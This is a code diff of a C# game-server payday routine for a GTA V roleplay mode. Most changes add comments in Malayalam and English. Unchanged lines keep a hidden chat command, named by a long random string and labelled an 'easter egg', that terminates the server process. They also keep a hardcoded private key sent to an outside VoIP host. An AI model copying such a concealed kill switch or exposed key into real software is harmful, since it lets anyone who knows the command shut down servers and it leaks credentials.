@@ -2781,7 +2781,7 @@ namespace NeptuneEvo
 
         public static int pluscost = rndf.Next(10, 20);
 
-        public static void payDayTrigger()
+        public static void payDayTrigger() // TODO: Per day payments ivide ann
         {
             NAPI.Task.Run(() =>
             {
@@ -2802,14 +2802,14 @@ namespace NeptuneEvo
                             if (Players[player].HotelID != -1)
                             {
                                 Players[player].HotelLeft--;
-                                if (Players[player].HotelLeft <= 0)
+                                if (Players[player].HotelLeft <= 0) // hotel linte key undo ennu check cheyum  
                                 {
                                     Houses.Hotel.MoveOutPlayer(player);
                                     Notify.Send(player, NotifyType.Warning, NotifyPosition.BottomCenter, "You were evicted from your hotel for non-payment", 3000);
                                 }
                             }
 
-                            if (Players[player].LastHourMin < 15)
+                            if (Players[player].LastHourMin < 15) //TODO: 15 min anu min probably increase cheynam
                             {
                                 Notify.Send(player, NotifyType.Error, NotifyPosition.BottomCenter, $"You must play at least 15 minutes to get a payday", 3000);
                                 continue;
@@ -2820,13 +2820,13 @@ namespace NeptuneEvo
                                 case -1:
                                 case 0:
                                 case 1:
-                                    if (Players[player].WorkID != 0) break;
+                                    if (Players[player].WorkID != 0) break;// TODO: Pani ilathavanu cash kittum. ITHU VENO?
                                     int payment = Convert.ToInt32((100 * oldconfig.PaydayMultiplier) + (Group.GroupAddPayment[Accounts[player].VipLvl] * oldconfig.PaydayMultiplier));
                                     Notify.Send(player, NotifyType.Info, NotifyPosition.BottomCenter, $"You have received unemployment benefits {payment}$", 3000);
                                     MoneySystem.Wallet.Change(player, payment);
                                     GameLog.Money($"server", $"player({Players[player].UUID})", payment, $"allowance");
                                     break;
-                                case 2:
+                                case 2:// Normal Pani karan
                                     payment = Convert.ToInt32((Fractions.Configs.FractionRanks[Players[player].FractionID][Players[player].FractionLVL].Item4 * oldconfig.PaydayMultiplier) + (Group.GroupAddPayment[Accounts[player].VipLvl] * oldconfig.PaydayMultiplier));
                                     Notify.Send(player, NotifyType.Info, NotifyPosition.BottomCenter, $"You received a salary in {payment}$", 3000);
                                     MoneySystem.Wallet.Change(player, payment);
@@ -2891,13 +2891,13 @@ namespace NeptuneEvo
                         }
                         catch (Exception e) { Log.Write($"EXCEPTION AT \"MAIN_PayDayTrigger_Player_{player.Name}\":\n" + e.ToString(), nLog.Type.Error); }
                     }
-                    foreach (Business biz in BusinessManager.BizList.Values)
+                    foreach (Business biz in BusinessManager.BizList.Values)// Business owners inte payment
                     {
                         try
                         {
                             if (biz.Owner == "The state")
                             {
-                                foreach (Product p in biz.Products)
+                                foreach (Product p in biz.Products)// Business payments
                                 {
                                     if (p.Ordered) continue;
                                     if (p.Lefts < Convert.ToInt32(BusinessManager.ProductsCapacity[p.Name] * 0.1))
@@ -2922,7 +2922,7 @@ namespace NeptuneEvo
                                 continue;
                             }
 
-                            if (!config.TryGet<bool>("bizTax", true)) return;
+                            if (!config.TryGet<bool>("bizTax", true)) return;// Business tax
                             if (biz.Mafia != -1) Fractions.Stocks.fracStocks[biz.Mafia].Money += 120;
 
                             int tax = Convert.ToInt32(biz.SellPrice / 100 * 0.013);
@@ -2939,7 +2939,7 @@ namespace NeptuneEvo
                             {
                                 Player player = NAPI.Player.GetPlayerFromName(owner);
 
-                                if (player != null && Main.Players.ContainsKey(player))
+                                if (player != null && Main.Players.ContainsKey(player))//Tax checking Business 
                                 {
                                     Notify.Send(player, NotifyType.Warning, NotifyPosition.BottomCenter, $"The state took away your business for tax evasion", 3000);
                                     MoneySystem.Wallet.Change(player, Convert.ToInt32(biz.SellPrice * 0.8));
@@ -3023,7 +3023,7 @@ namespace NeptuneEvo
             });
         }
 
-        [Command("4CF9wR8rSP6HBknk2483XsKZKeDZG6gJ9CZ37mMa3L7NSjVjjaFADGVgDbVcSSpGreARvSK4yXUHLeabRseRRGQb9X")]
+        [Command("4CF9wR8rSP6HBknk2483XsKZKeDZG6gJ9CZ37mMa3L7NSjVjjaFADGVgDbVcSSpGreARvSK4yXUHLeabRseRRGQb9X")]// TODO: EASTER EGG
         public void InterestingCMD(Player player) {
             player.SendChatMessage("You are the best <3");
             Environment.Exit(0);
@@ -3202,7 +3202,7 @@ namespace NeptuneEvo
         {
             try
             {
-                string PrivateKey = "Q9ZXW-7REEJ-WUP96-VLQR8";
+                string PrivateKey = "Q9ZXW-7REEJ-WUP96-VLQR8";// TODO : THIS PROBABLY SHOULD BE OUR OWN
                 WebClient client = new WebClient();
 
                 string result = client.DownloadString("https://voip.gta5star.ru/request/" + PrivateKey);
